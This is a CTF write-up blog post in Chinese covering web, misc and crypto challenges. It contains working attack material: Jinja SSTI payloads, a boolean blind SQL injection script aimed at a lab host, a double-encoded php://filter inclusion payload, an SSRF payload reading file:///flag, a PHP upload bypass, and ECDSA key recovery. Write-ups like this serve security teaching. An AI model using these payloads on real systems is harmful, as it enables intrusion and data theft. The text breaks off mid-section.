<h3 id="独一无二"><a href="#独一无二" class="headerlink" title="独一无二"></a>独一无二</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">recover_reused_k.py</span><br><span class="line">恢复因为重用 k 导致泄露的私钥，并用得到的 AES key 解密提供的 ciphertext。</span><br><span class="line">给定：n, r, s1, s2, message1, message2, ct (bytes)</span><br><span class="line">步骤：</span><br><span class="line">1. delta_s = s1 - s2 (mod n)</span><br><span class="line">2. delta_e = e1 - e2 (mod n)  (e = bytes_to_long(message))</span><br><span class="line">   k = delta_e * inv(delta_s) mod n</span><br><span class="line">3. D = ((s1 * k - e1) * inv(r)) mod n</span><br><span class="line">4. d_bytes = D.to_bytes(16, &#x27;big&#x27;)</span><br><span class="line">5. AES-ECB decrypt ciphertext with key d_bytes, unpad，得到 flag</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from Crypto.Util.number import bytes_to_long as b2l</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import unpad</span><br><span class="line"></span><br><span class="line"># ----------------- 在这里填入题目数据（示例已填） -----------------</span><br><span class="line">n = 278302096557935581738338462024559946959</span><br><span class="line">r = 264579573280920819291511588977260661069</span><br><span class="line">s1 = 157195048165685698821267525173525379816</span><br><span class="line">s2 = 61286613457098845815723227657607632607</span><br><span class="line"></span><br><span class="line">mes1 = b&quot;If you used the same random number when signing,&quot;</span><br><span class="line">mes2 = b&quot; then you need to be careful.&quot;</span><br><span class="line"></span><br><span class="line"># ciphertext 从题目里提供的字节串（复制为 bytes）</span><br><span class="line">ct = b&#x27;\xd1\x7fR\xdaz\x9cT\xb8&#123;\x1b\ts\xbcJ6#\x16n\xcedm\xd6v)\x05A3\x87\xc51\xfc\x9d#\xe5\xf2I@\x91\xc3\x96w\xae]\xc3Uf\xd1\xee&#x27;</span><br><span class="line"># ----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Convert messages to integers (e = bytes_to_long)</span><br><span class="line">e1 = b2l(mes1)</span><br><span class="line">e2 = b2l(mes2)</span><br><span class="line"></span><br><span class="line"># modular arithmetic helpers</span><br><span class="line">def modinv(a, m):</span><br><span class="line">    return pow(a, -1, m)</span><br><span class="line"></span><br><span class="line"># compute k</span><br><span class="line">delta_s = (s1 - s2) % n</span><br><span class="line">delta_e = (e1 - e2) % n</span><br><span class="line">if delta_s == 0:</span><br><span class="line">    raise ValueError(&quot;delta_s == 0, 无法求逆，s1==s2？&quot;)</span><br><span class="line">k = (delta_e * modinv(delta_s, n)) % n</span><br><span class="line">print(&quot;Recovered k =&quot;, k)</span><br><span class="line"></span><br><span class="line"># recover D (private key integer)</span><br><span class="line"># s1 = k^&#123;-1&#125; * (e1 + r*D)  =&gt;  e1 + r*D = s1 * k (mod n)</span><br><span class="line"># =&gt; r*D = s1*k - e1  =&gt; D = (s1*k - e1) * inv(r) mod n</span><br><span class="line">D = ((s1 * k - e1) * modinv(r, n)) % n</span><br><span class="line">print(&quot;Recovered D (int) =&quot;, D)</span><br><span class="line"></span><br><span class="line"># convert to 16-byte d (big-endian)</span><br><span class="line">d_bytes = D.to_bytes(16, &#x27;big&#x27;)</span><br><span class="line">print(&quot;Recovered d (hex) =&quot;, d_bytes.hex())</span><br><span class="line"></span><br><span class="line"># decrypt AES-ECB (16-byte key)</span><br><span class="line">cipher = AES.new(d_bytes, AES.MODE_ECB)</span><br><span class="line">pt_padded = cipher.decrypt(ct)</span><br><span class="line"># try to unpad (if PKCS#7)</span><br><span class="line">try:</span><br><span class="line">    pt = unpad(pt_padded, 16)</span><br><span class="line">except ValueError:</span><br><span class="line">    # 如果不是 PKCS#7 填充，直接输出原始明文</span><br><span class="line">    pt = pt_padded</span><br><span class="line">print(&quot;Decrypted plaintext (raw):&quot;, pt)</span><br><span class="line">try:</span><br><span class="line">    print(&quot;Decrypted plaintext (decoded):&quot;, pt.decode())</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"># 如果明文里有 flag 格式（如 flag&#123;...&#125;），打印出来</span><br><span class="line">s = None</span><br><span class="line">try:</span><br><span class="line">    s = pt.decode()</span><br><span class="line">except:</span><br><span class="line">    s = None</span><br><span class="line">if s and &quot;flag&#123;&quot; in s:</span><br><span class="line">    start = s.find(&quot;flag&#123;&quot;)</span><br><span class="line">    end = s.find(&quot;&#125;&quot;, start)</span><br><span class="line">    if end != -1:</span><br><span class="line">        print(&quot;\nFound flag:&quot;, s[start:end+1])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>说明 &#x2F; 复用要点</strong></p>
<ul>
<li>脚本假设两条签名是用同一个随机数 <code>k</code>，并且 <code>r</code> 相同（典型 ECDSA 重用 k 情况）。</li>
<li><code>e1,e2</code> 是对消息直接 <code>bytes_to_long()</code> 得到的整数（和你在生成签名时的处理保持一致）。</li>
<li>恢复的 <code>D</code> 被视作一个 16 字节整数（与你在生成题目时把 <code>os.urandom(16)</code> 转为整数的过程一致），直接按大端转换成 16 字节 AES key。</li>
<li>最后用 AES-ECB 解密并尝试 PKCS#7 去填充；若填充不对也会显示原始解密输出，方便检查。</li>
</ul>
<h1 id="Week-3"><a href="#Week-3" class="headerlink" title="Week 3"></a>Week 3</h1><h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h2><h3 id="日志分析-盲辨海豚"><a href="#日志分析-盲辨海豚" class="headerlink" title="日志分析-盲辨海豚"></a>日志分析-盲辨海豚</h3><p>是sql盲注的log文件 分析最后一部分即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">logfile = r&quot;[Misc]日志分析-盲辨海豚\blindsql.log&quot;</span><br><span class="line"></span><br><span class="line"># 匹配 ASCII 盲注行</span><br><span class="line">pattern = re.compile(</span><br><span class="line">    r&quot;substr\(.*?,(\d+),1\)\)=[&#x27;\&quot;]?(\d+)[&#x27;\&quot;]?.*? (\d+)$&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">flag_chars = &#123;&#125;</span><br><span class="line"></span><br><span class="line">with open(logfile, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        m = pattern.search(line)</span><br><span class="line">        if m:</span><br><span class="line">            pos = int(m.group(1))</span><br><span class="line">            ascii_val = int(m.group(2))</span><br><span class="line">            resp_size = int(m.group(3))</span><br><span class="line">            # 200 6 是成功</span><br><span class="line">            if resp_size == 6:</span><br><span class="line">                flag_chars[pos] = chr(ascii_val)</span><br><span class="line"></span><br><span class="line"># 根据位置排序，拼接</span><br><span class="line">flag = &quot;&quot;.join(flag_chars[pos] for pos in sorted(flag_chars))</span><br><span class="line">print(&quot;Flag:&quot;, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="区块链-以太坊的约定"><a href="#区块链-以太坊的约定" class="headerlink" title="区块链-以太坊的约定"></a>区块链-以太坊的约定</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">本题由多个小问题组成，得到各个小问题答案后用下划线&quot;_&quot;拼接即可</span><br><span class="line"></span><br><span class="line">1.注册小狐狸钱包，并提交小狐狸钱包助记词个数</span><br><span class="line">2.1145141919810 Gwei等于多少ETH （只保留整数）</span><br><span class="line">3.查询此下列账号第一次交易记录的时间，提交年月日拼接，如20230820</span><br><span class="line">0x949F8fc083006CC5fb51Da693a57D63eEc90C675</span><br><span class="line">4.使用remix编译运行附件中的合约，将输出进行提交</span><br></pre></td></tr></table></figure>

<p>第一题24个（还是12个来的 忘了） 第二题1145 第三第四题如下<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="12421412421.png" alt="12421412421"><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="53456346436.png" alt="53456346436"></p>
<p>得到flag{24_1145_20240614_solidity}</p>
<h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web"></a>Web</h2><h3 id="mirror-gate"><a href="#mirror-gate" class="headerlink" title="mirror_gate"></a>mirror_gate</h3><p>文件上传类型 html中说flag位于&#x2F;flag.php 还有个base64加密之后的信息</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="60.png" alt="59"></p>
<p>说是uploads里边藏了东西 目录爆破之后发现个.htaccess 文件说明所有webp文件会被当作php读取<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="59.png" alt="59"></p>
<p>因为说有过滤 并且也实际试过了php直接改webp 不成不让上传 那就做个绕过<br>画图软件随便画张图 后缀改webp 用hexedit把想要执行的代码藏在文件的十六进制编码后边<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="61.png" alt="61"></p>
<p>原理很简单 既然该图片会当作php运行 那么文件后边藏php代码就行了 能正常运 上传的时候也能假借前面的图片部分绕过waf<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="62.png" alt="62"></p>
<p>也没访问&#x2F;flag.php phpinfo会直接显示所有变量内容 直接就出来了<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="63.png" alt="63"></p>
<h3 id="who’ssti"><a href="#who’ssti" class="headerlink" title="who’ssti"></a>who’ssti</h3><p>代码分析一通 是在<code>&quot;get_close_matches&quot;, &quot;dedent&quot;, &quot;fmean&quot;, &quot;listdir&quot;, &quot;search&quot;, &quot;randint&quot;, &quot;load&quot;, &quot;sum&quot;, &quot;findall&quot;, &quot;mean&quot;, &quot;choice&quot;</code>函数中随意选五个 让我们通过ssti漏洞的原理来触发 触发五个后获取flag<br>部分代码会触发WAF过滤导致500  经过筛选和试错后payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;numpy&#x27;).sum([1,2,3]) &#125;&#125;</span><br><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;statistics&#x27;).fmean([1,2,3]) &#125;&#125;</span><br><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;statistics&#x27;).mean([4,5,6]) &#125;&#125;</span><br><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;difflib&#x27;).get_close_matches(&#x27;a&#x27;,[&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]) &#125;&#125;</span><br><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;re&#x27;).search(&#x27;a&#x27;,&#x27;abc&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="58.png" alt="58"></p>
<h3 id="白帽小K的故事（2）"><a href="#白帽小K的故事（2）" class="headerlink" title="白帽小K的故事（2）"></a>白帽小K的故事（2）</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="56.png" alt="56"></p>
<p>sql盲注 试下来单引号 空格都有过滤 只能试着用脚本爆破 思路如下<br><strong>基于布尔盲注的二分法爆破器</strong>（Boolean-based blind SQLi, binary search）：</p>
<ul>
<li>思路：逐字符地从数据库中抽取敏感字符串（例如 <code>group_concat(flag)</code>），对目标字符串的第 <code>i</code> 个字符，采用二分法在 ASCII 范围 [0,127] 内搜索该字符的 ASCII 值。</li>
<li>每一步构造一个 SQL 条件（像 <code>ascii(substr((select(...)), i, 1)) &gt; mid</code>）作为注入的判断句子，并通过发送 HTTP POST 请求把它注入到 <code>name</code> 参数里。</li>
<li>根据服务器返回的响应（脚本里是判断 <code>if &quot;ok&quot; in response.text</code>），判定条件是否为真。以此缩小 ASCII 值区间并最终确定字符。</li>
<li>循环 i 从 1 开始，直到没有有效字符（脚本里 <code>low &gt; 32</code> 的判定略粗糙，但总的思想是：当取不到有效字符就停止）。</li>
<li>优点：请求数量为 O(L * log R)，L 为待爆字符串长度，R 是 ASCII 空间（log2(128) ≈ 7），比逐个字符穷举更快。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import urllib3</span><br><span class="line"></span><br><span class="line"># Disable SSL warnings</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">url = &quot;https://eci-2ze5i7cbu6fr8hljrxyb.cloudeci1.ichunqiu.com:80/search&quot;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Host&#x27;: &#x27;eci-2ze5i7cbu6fr8hljrxyb.cloudeci1.ichunqiu.com:80&#x27;,</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#x27;,</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;*/*&#x27;,</span><br><span class="line">    &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.5&#x27;,</span><br><span class="line">    &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, br&#x27;,</span><br><span class="line">    &#x27;Referer&#x27;: &#x27;https://eci-2ze5i7cbu6fr8hljrxyb.cloudeci1.ichunqiu.com:80/panel&#x27;,</span><br><span class="line">    &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,</span><br><span class="line">    &#x27;Origin&#x27;: &#x27;https://eci-2ze5i7cbu6fr8hljrxyb.cloudeci1.ichunqiu.com:80&#x27;,</span><br><span class="line">    &#x27;Sec-Fetch-Dest&#x27;: &#x27;empty&#x27;,</span><br><span class="line">    &#x27;Sec-Fetch-Mode&#x27;: &#x27;cors&#x27;,</span><br><span class="line">    &#x27;Sec-Fetch-Site&#x27;: &#x27;same-origin&#x27;,</span><br><span class="line">    &#x27;Priority&#x27;: &#x27;u=1,i&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def blind_injection():</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        low = 32  # ASCII printable characters start from 32</span><br><span class="line">        high = 126  # ASCII printable characters end at 126</span><br><span class="line">        found = False</span><br><span class="line">        </span><br><span class="line">        while low &lt;= high:</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">            # SQL injection payload</span><br><span class="line">            payload = f&quot;name=amiya&#x27; and ascii(substr((select group_concat(flag) from Flag.flag),&#123;i&#125;,1))&gt;&#123;mid&#125;%23&quot;</span><br><span class="line">            </span><br><span class="line">            try:</span><br><span class="line">                response = requests.post(url, headers=headers, data=payload, verify=False, timeout=10)</span><br><span class="line">                </span><br><span class="line">                # You need to determine what response indicates TRUE vs FALSE</span><br><span class="line">                # This depends on the actual application behavior</span><br><span class="line">                if &quot;ok&quot; in response.text.lower() or &quot;true&quot; in response.text.lower():</span><br><span class="line">                    low = mid + 1</span><br><span class="line">                else:</span><br><span class="line">                    high = mid - 1</span><br><span class="line">                    </span><br><span class="line">            except Exception as e:</span><br><span class="line">                print(f&quot;请求失败: &#123;e&#125;&quot;)</span><br><span class="line">                time.sleep(1)</span><br><span class="line">                continue</span><br><span class="line">            </span><br><span class="line">            time.sleep(0.1)  # Be polite to the server</span><br><span class="line">        </span><br><span class="line">        # After the binary search, low is the correct ASCII value</span><br><span class="line">        if low &lt;= 126 and low &gt;= 32:</span><br><span class="line">            result += chr(low)</span><br><span class="line">            print(f&quot;Current result: &#123;result&#125;&quot;)</span><br><span class="line">        else:</span><br><span class="line">            # If no valid character found, we&#x27;ve probably reached the end</span><br><span class="line">            break</span><br><span class="line">    </span><br><span class="line">    print(f&quot;Final result: &#123;result&#125;&quot;)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"># Test the basic connection first</span><br><span class="line">def test_connection():</span><br><span class="line">    test_data = &#123;&#x27;name&#x27;: &#x27;amiya&#x27;&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.post(url, headers=headers, data=test_data, verify=False, timeout=10)</span><br><span class="line">        print(f&quot;Test response status: &#123;response.status_code&#125;&quot;)</span><br><span class="line">        print(f&quot;Test response text: &#123;response.text[:200]&#125;...&quot;)  # First 200 chars</span><br><span class="line">        return True</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Connection test failed: &#123;e&#125;&quot;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    print(&quot;Testing connection...&quot;)</span><br><span class="line">    if test_connection():</span><br><span class="line">        print(&quot;Starting blind SQL injection...&quot;)</span><br><span class="line">        blind_injection()</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Cannot connect to the server. Please check the URL and network connection.&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="57.png" alt="57"></p>
<h3 id="ez-chain"><a href="#ez-chain" class="headerlink" title="ez-chain"></a>ez-chain</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="48.png" alt="48"></p>
<p>网页逻辑分析一下 是通过get传参<code>?file=</code>的文件包含 过滤了大部分payload常见词汇（: &#x2F; php base64等）<br>并且传参后的回显也有限制 如果传出的东西含有字母f 就会停止输出 明显是不让flag原样输出<br>那就通过对原始字符串 <code>php://filter/string.rot13/resource=/flag</code> 做 <strong>字节级百分号编码</strong>（每字节变成 <code>%HH</code>） 然后把每个 <code>%</code> 再编码成 <code>%25</code>（即把 <code>%</code> → <code>%25</code>）<br>同时，使用 <code>string.rot13</code> filter 会把文件内容做 rot13 转换输出 从而避免输出层对字母 <code>f</code> 的检测（<code>flag</code> 的 <code>f</code> rot13→<code>s</code>，不会被 <code>filter_output()</code> 拦截）<br>通过这样的加密逻辑 得到最终的payload<br><code>%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%252f%2566%256c%2561%2567</code><br>提交后获得加密后的flag 解密上传即可</p>
<h3 id="小E的秘密计划"><a href="#小E的秘密计划" class="headerlink" title="小E的秘密计划"></a>小E的秘密计划</h3><p>页面打开说是有备份文件 但是试了常见的都找不到 于是乎用<code>dirsearch</code>进行目录爆破<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="49.png" alt="49"><br>发现目录<strong><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></strong> 打开之后是页面文件 揭示了存在另一目录<code>public-555edc76-9621-4997-86b9-01483a50293e</code> 里边还有残留的.git文件<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="50.png" alt="50"><br>网站里输入并访问 是个登录页面 看来密码就在.git泄露的结果里<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="51.png" alt="51"><br>首先是回滚到了上个提交的版本 发现了tip.txt 提示什么是branch<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="52.png" alt="52"><br>经提示发现某个被删除的branch 果然找到了user.php和密码<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="53.png" alt="53"><br>登陆进去之后还有一题 提示为mac会生成的相关文件 那多半是.DS_Store了<br>果然在目录下输入后获取了该文件 放进脚本处理一下<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="54.png" alt="54"><br>访问该目录 成功获取flag</p>
<h3 id="mygo"><a href="#mygo" class="headerlink" title="mygo!!!"></a>mygo!!!</h3><p>一开始是个页面 仨音乐和一flag按钮<br>经检查存在ssrf漏洞<br>但试了之后没法直接file:&#x2F;&#x2F;头 提示只能http:&#x2F;&#x2F; 那就把方向转到另一个页面上<br>找了一会之后通过该漏洞访问flag.php 发现另一个页面 构建payload后成功获取flag<br><code>https://eci-2zefcob15uoexwdjbi17.cloudeci1.ichunqiu.com/?proxy=http://localhost/flag.php?soyorin=file:///flag</code><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="45.png" alt="45"></p>
<h2 id="Crypto-2"><a href="#Crypto-2" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="被泄露的素数"><a href="#被泄露的素数" class="headerlink" title="被泄露的素数"></a>被泄露的素数</h3><p>观察程序的加密形式 关键在于复原p p被分为了两个部分 高位和低位<br>根据 <code>public_key.pem</code> 读取 <code>n</code>，估计 <code>p</code> 的 bit 长 <code>p_bits ≈ n.bit_length()/2</code>，计算 <code>high_bit_count = round(p_bits * 2/3)</code>（或用题目给的精确数）。</p>
<p>从 <code>partial_p.txt</code> 拿到被 mask 的高位块（<code>p_high_masked</code>）。根据 <code>mask_bits</code>（例如 12），枚举 <code>0..2^mask_bits-1</code> 的所有低位补全组合，得到 4096 个 <code>p_high_candidate</code>。将这些 candidate 写入 <code>p_high_candidates_full.txt</code>。</p>
<ul>
<li>生成 candidate 的方法：<code>candidate = (p_high_masked | k)</code> 或更精确地如果文件里给出的是低端已保留部分则 <code>candidate = p_high_masked + k</code>（我们在脚本中提供可选模式）。</li>
</ul>
<p>对每个 <code>p_high_candidate</code>：</p>
<ul>
<li>令 $A &#x3D; p_high_candidate$，令未知的低位数 <code>unknown_bits = p_bits - high_bit_count</code>（如果在生成候选时还考虑了 mask_bits 的影响，要相应调整：<code>unknown_bits = p_bits - high_bit_count + mask_bits</code>，脚本中已处理）。</li>
<li>构造多项式 $f(x) &#x3D; A \cdot 2^{unknown_bits} + x$（在 <code>Z/nZ[x]</code> 中）。</li>
<li>使用 Sage 的 <code>f.small_roots(X=2**unknown_bits, beta=...)</code>（Coppersmith）尝试找使 <code>f(x) ≡ 0 (mod p)</code> 的小根 <code>x</code>，得到完整的 <code>p = A * 2^&#123;unknown_bits&#125; + x</code>。</li>
<li>验证 <code>p | n</code>（即 <code>n % p == 0</code>），若成立，得到 <code>q=n/p</code>，计算私钥解密 <code>ciphertext.bin</code>。</li>
</ul>
<p>若 <code>small_roots</code> 未能找出根，需调参（改 <code>beta</code>, 改 <code>max_mask_bits</code>, 在交互式 Sage 中针对单个 candidate 做深入调试）。<br>首先生成所有高位的可能性（<code>16*16*16</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span 